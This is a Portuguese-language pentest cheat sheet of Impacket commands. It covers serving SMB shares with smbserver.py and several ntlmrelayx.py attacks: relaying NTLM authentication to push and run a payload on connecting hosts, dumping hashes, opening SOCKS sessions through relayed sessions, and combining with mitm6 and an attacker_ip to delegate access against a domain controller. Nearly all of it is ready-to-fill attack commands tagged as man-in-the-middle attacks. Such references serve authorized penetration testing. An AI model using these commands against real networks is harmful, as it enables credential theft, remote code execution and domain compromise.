# Impacket

## smbserver - share smb pasta
#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

Implementação de um servidor SMB usando python. Permite rapidamente configurar shares e contas de usuario. 

```
smbserver.py <shareName> <sharePath>
```

## smbserver - share smb pasta com autenticação
#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 

```
smbserver.py -username <username> -password <password> <shareName> <sharePath>
```

## ntlmrelay - hospeda um payload que sera entregue automaticamente para o host remoto que se conectar.

#plateform/linux #target/serve #cat/ATTACK/MITM 

```
ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
```

## ntlmrelay - socks
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -socks -smb2support
```

## ntlmrelay - autentica e realiza o dump de hashes.
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -smb2support
```

## ntlmrelay - para usar com mitm6 - Encaminha para o alvo

#plateform/linux #target/serve #cat/ATTACK/MITM 
Em seguida, use SOCKS com o proxychains : 
proxychains smbclient //ip/Users -U domain/user

```
ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
```

## ntlmrelay - para usar com mitm6 - delegar acesso
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
```